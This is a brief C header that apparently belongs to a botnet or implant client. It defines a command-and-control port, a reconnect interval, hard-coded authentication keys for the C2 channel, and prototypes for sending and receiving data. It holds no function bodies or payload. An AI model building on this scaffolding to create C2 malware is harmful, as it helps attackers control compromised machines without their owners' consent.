#include <stdio.h>

#define CNC_PORT "5000"
#define SLEEP_INTERVAL_ON_CONNREFUSED_MS 30 * 1000

#define AUTH_KEY_TO_CNC "4be166c8-5aa2-4db2-90a1-446aacd14d32"
#define AUTH_KEY_FROM_CNC "b6c077c1-12d1-4dbb-8786-d22a7090bfae"
#define AUTH_KEY_LEN 36

void init_cnc_conn();
int send_cnc(void *buf, size_t len);
int recv_cnc(void *buf, size_t len);
int recvall_cnc(void *buf, size_t len);